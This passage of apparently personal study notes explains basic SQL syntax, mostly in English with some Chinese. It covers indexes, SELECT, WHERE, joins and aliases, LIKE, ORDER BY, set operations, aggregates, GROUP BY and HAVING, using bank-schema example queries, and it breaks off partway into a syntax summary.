</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#note-db-sql-__codelineno-16-3"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">index_name</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">table_name</span><span class="p">(</span><span class="n">attribute_list</span><span class="p">);</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#note-db-sql-__codelineno-16-4"></a><span class="c1">-- drop index</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#note-db-sql-__codelineno-16-5"></a><span class="k">DROP</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">index_name</span><span class="p">;</span>
</span></code></pre></div>
<p>Example:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-db-sql-__codelineno-17-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_last_name</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">employees</span><span class="p">(</span><span class="n">last_name</span><span class="p">);</span>
</span></code></pre></div>
<h2 id="note-db-sql-basic-structure">Basic Structure<a class="headerlink" href="#note-db-sql-basic-structure" title="Permanent link">&para;</a></h2>
<h3 id="note-db-sql-the-select-clause">The select clause<a class="headerlink" href="#note-db-sql-the-select-clause" title="Permanent link">&para;</a></h3>
<p>The select clause is used to select the data from the database.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-db-sql-__codelineno-18-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
</span></code></pre></div>
<p>such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-db-sql-__codelineno-19-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">;</span>
</span></code></pre></div>
<p>where <code>*</code> is the wildcard character, it means all the attributes.</p>
<p>SQL allows duplicates in relations as well as in query results. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-db-sql-__codelineno-20-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
</span></code></pre></div>
<p>where <code>DISTINCT</code> is used to remove duplicates.</p>
<p>the opposite of <code>DISTINCT</code> is <code>ALL</code>, which means all the duplicates are kept.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-db-sql-__codelineno-21-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
</span></code></pre></div>
<p>By default, the select clause returns all the attributes of the relation.</p>
<h3 id="note-db-sql-the-where-clause">The where clause<a class="headerlink" href="#note-db-sql-the-where-clause" title="Permanent link">&para;</a></h3>
<p>The where clause is used to filter the data from the database.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-db-sql-__codelineno-22-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span>
</span></code></pre></div>
<p>such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-db-sql-__codelineno-23-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">salary</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">5000</span><span class="p">;</span>
</span></code></pre></div>
<p>Comparison results can be combined using the logical connectives:</p>
<ul>
<li><code>AND</code>: Both conditions must be true</li>
<li><code>OR</code>: At least one condition must be true  </li>
<li><code>NOT</code>: Negates a condition</li>
</ul>
<p>The <code>BETWEEN</code> operator can be used to specify a range:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-db-sql-__codelineno-24-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">amount</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#note-db-sql-__codelineno-24-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#note-db-sql-__codelineno-24-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span><span class="k">BETWEEN</span><span class="w"> </span><span class="mi">1000</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">10000</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Downtown&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>The <code>IN</code> operator can be used to specify a list of values:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-db-sql-__codelineno-25-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">amount</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#note-db-sql-__codelineno-25-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#note-db-sql-__codelineno-25-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="mi">2000</span><span class="p">,</span><span class="w"> </span><span class="mi">3000</span><span class="p">);</span>
</span></code></pre></div>
<h3 id="note-db-sql-the-from-clause">The from clause<a class="headerlink" href="#note-db-sql-the-from-clause" title="Permanent link">&para;</a></h3>
<p>The from clause is used to specify the table from which to select the data.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-db-sql-__codelineno-26-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table_name1</span><span class="p">,</span><span class="w"> </span><span class="n">table_name2</span><span class="p">,</span><span class="w"> </span><span class="p">...;</span>
</span></code></pre></div>
<p>such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-db-sql-__codelineno-27-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">branch_city</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-db-sql-__codelineno-27-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="p">,</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#note-db-sql-__codelineno-27-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch_name</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return a Cartesian product of the two tables.</p>
<p>if there are multiple tables contain the same attribute, we need to use the table name to specify the attribute.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-db-sql-__codelineno-28-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch</span><span class="p">.</span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">branch_city</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#note-db-sql-__codelineno-28-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="p">,</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#note-db-sql-__codelineno-28-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch_name</span><span class="p">;</span>
</span></code></pre></div>
<h3 id="note-db-sql-the-rename-operation">The rename operation<a class="headerlink" href="#note-db-sql-the-rename-operation" title="Permanent link">&para;</a></h3>
<p>The rename operation is used to rename the attributes of the relation.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-db-sql-__codelineno-29-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">new_attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
</span></code></pre></div>
<p>such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-db-sql-__codelineno-30-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">branch</span><span class="p">,</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">city</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#note-db-sql-__codelineno-30-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="p">;</span>
</span></code></pre></div>
<p>Tuple variables are defined in the FROM clause via the use of the as clause. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-db-sql-__codelineno-31-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#note-db-sql-__codelineno-31-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">S</span><span class="w"> </span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#note-db-sql-__codelineno-31-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#note-db-sql-__codelineno-31-4"></a><span class="k">AND</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span>
</span></code></pre></div>
<p>In SQL, the use of the <code>AS</code> keyword to define the table alias is optional. The alias can be defined directly in the <code>FROM</code> clause without using the <code>AS</code> keyword. Therefore, you can remove the <code>AS</code> keyword, and the code will still work. Here is the code without the <code>AS</code> keyword:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-db-sql-__codelineno-32-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#note-db-sql-__codelineno-32-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="n">S</span><span class="w"> </span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#note-db-sql-__codelineno-32-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#note-db-sql-__codelineno-32-4"></a><span class="k">AND</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span>
</span></code></pre></div>
<div class="admonition question">
<p class="admonition-title">Question</p>
<p>Find the names of all branches that have greater assets than some branch located in city Brooklyn. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-db-sql-__codelineno-33-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#note-db-sql-__codelineno-33-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">S</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#note-db-sql-__codelineno-33-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">assets</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">assets</span><span class="w"> </span>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#note-db-sql-__codelineno-33-4"></a><span class="w">    </span><span class="k">AND</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span><span class="p">;</span>
</span></code></pre></div>
</div>
<h3 id="note-db-sql-string-operation">String operation<a class="headerlink" href="#note-db-sql-string-operation" title="Permanent link">&para;</a></h3>
<h4 id="note-db-sql-fuzzy-matching">fuzzy matching<a class="headerlink" href="#note-db-sql-fuzzy-matching" title="Permanent link">&para;</a></h4>
<p>SQL includes a string-matching operator for comparisons on character strings. Patterns are described using the following two special characters: </p>
<ul>
<li><code>%</code>: Matches any sequence of characters</li>
<li><code>_</code>: Matches any single character</li>
</ul>
<p>with this,we can achieve the fuzzy matching.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-db-sql-__codelineno-34-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;S%&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return all the employees whose last name starts with 'S'.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#note-db-sql-__codelineno-35-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;_o%&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return all the employees whose last name has 'o' as the second character.</p>
<p>It should be use in the where clause and must be used in conjunction with the <code>LIKE</code> operator.</p>
<h4 id="note-db-sql-other-string-operations">other string operations<a class="headerlink" href="#note-db-sql-other-string-operations" title="Permanent link">&para;</a></h4>
<p>SQL provides the <code>||</code> operator to concatenate strings.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#note-db-sql-__codelineno-36-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;Hello&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39; &#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39;World&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return 'Hello World'.</p>
<p>Converting string from upper case to lower case:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#note-db-sql-__codelineno-37-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">LOWER</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#note-db-sql-__codelineno-37-2"></a><span class="c1">-- output: hello</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#note-db-sql-__codelineno-37-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">UPPER</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#note-db-sql-__codelineno-37-4"></a><span class="c1">-- output: HELLO</span>
</span></code></pre></div>
<h3 id="note-db-sql-ordering-the-display-of-results">Ordering the display of results<a class="headerlink" href="#note-db-sql-ordering-the-display-of-results" title="Permanent link">&para;</a></h3>
<p>ordering the display of results is achieved by using the <code>ORDER BY</code> clause.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#note-db-sql-__codelineno-38-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">attribute_name</span><span class="p">;</span>
</span></code></pre></div>
<p>We may specify desc for descending order or asc for ascending order, and for each attribute, ascending order is the default. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#note-db-sql-__codelineno-39-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">salary</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return all the employees sorted by salary in descending order.</p>
<h2 id="note-db-sql-set-operations">SET Operations<a class="headerlink" href="#note-db-sql-set-operations" title="Permanent link">&para;</a></h2>
<p>In SQL, use the set operations including <code>UNION</code>, <code>INTERSECT</code>, and <code>EXCEPT</code> operate on relations as well as correspond to the relational algebra operations <span class="arithmatex">\(\cup\)</span>, <span class="arithmatex">\(\cap\)</span>, and <span class="arithmatex">\(\setminus\)</span>.</p>
<p>Each of the operations including <code>UNION</code>, <code>INTERSECT</code>, and <code>EXCEPT</code> automatically eliminates duplicates. To retain duplicates, use <code>UNION ALL</code>, <code>INTERSECT ALL</code>, and <code>EXCEPT ALL</code> instead.</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Find all customers who have a loan or an account or both. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#note-db-sql-__codelineno-40-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#note-db-sql-__codelineno-40-2"></a><span class="k">UNION</span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#note-db-sql-__codelineno-40-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="p">;</span>
</span></code></pre></div>
<p>Find all customers who have both a loan and an account.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#note-db-sql-__codelineno-41-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#note-db-sql-__codelineno-41-2"></a><span class="k">INTERSECT</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#note-db-sql-__codelineno-41-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="p">;</span>
</span></code></pre></div>
<p>Find all customers who have a loan but not an account.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#note-db-sql-__codelineno-42-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#note-db-sql-__codelineno-42-2"></a><span class="k">EXCEPT</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#note-db-sql-__codelineno-42-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="p">;</span>
</span></code></pre></div>
</div>
<h2 id="note-db-sql-aggregate-functions">Aggregate Functions<a class="headerlink" href="#note-db-sql-aggregate-functions" title="Permanent link">&para;</a></h2>
<p>Aggregate functions are used to perform calculations on a set of values(a column) and return a single value.</p>
<ul>
<li><code>COUNT</code>: Counts the number of rows</li>
<li><code>SUM</code>: Calculates the sum of a set of values</li>
<li><code>AVG</code>: Calculates the average of a set of values</li>
<li><code>MAX</code>: Finds the maximum value</li>
<li><code>MIN</code>: Finds the minimum value</li>
</ul>
<p>Such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#note-db-sql-__codelineno-43-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">total_employees</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return the number of rows in the employees table.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The <code>COUNT(*)</code> function counts all rows, including those with null values.</p>
<p>But <code>COUNT(attribute_name)</code> function counts only the rows where the attribute is not null.</p>
<p>We can also use <code>COUNT(distinct attribute_name)</code> to count the number of distinct values in a column.</p>
</div>
<h3 id="note-db-sql-group-by">Group By<a class="headerlink" href="#note-db-sql-group-by" title="Permanent link">&para;</a></h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#note-db-sql-__codelineno-44-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#note-db-sql-__codelineno-44-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#note-db-sql-__codelineno-44-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>在 SQL 中，当你在 <code>SELECT</code> 子句中使用聚合函数（例如 <code>AVG</code>、<code>SUM</code> 等）时，所有不在聚合函数中的属性（字段）必须出现在 <code>GROUP BY</code> 子句中。这是因为 SQL 需要知道如何对数据进行分组，以便正确地计算聚合值。</p>
<p>否则在这种情况下，在前面要求了挑出Branch_name,where 中又要求branch_name = 'Perryridge'；没什么意义</p>
<p>正确的写法是：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#note-db-sql-__codelineno-45-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#note-db-sql-__codelineno-45-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#note-db-sql-__codelineno-45-3"></a><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">branch_name</span><span class="p">;</span>
</span></code></pre></div>
<h3 id="note-db-sql-having">Having<a class="headerlink" href="#note-db-sql-having" title="Permanent link">&para;</a></h3>
<p>The <code>HAVING</code> clause is used to filter the results of a <code>GROUP BY</code> operation.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#note-db-sql-__codelineno-46-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#note-db-sql-__codelineno-46-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#note-db-sql-__codelineno-46-3"></a><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="k">HAVING</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return all the branches whose average balance is greater than 1000.</p>
<h2 id="note-db-sql-summary-of-select">Summary of Select<a class="headerlink" href="#note-db-sql-summary-of-select" title="Permanent link">&para;</a></h2>
<p>Select 语句的完整语法如下：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#note-db-sql-__codelineno-47-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">&lt;</span><span class="p">[</span><span class="k">DISTINCT</span><span class="p">]</span><span class="w"> </span><span class="n">c1</span><span class="p">,</span><span class="w"> </span><span class="n">c2</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="o">&gt;</span><span class="w"> </span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#note-db-sql-__codelineno-47-2"></a><span class="w">        </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="n">r1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="o">&gt;</span><span class="w"> </span>
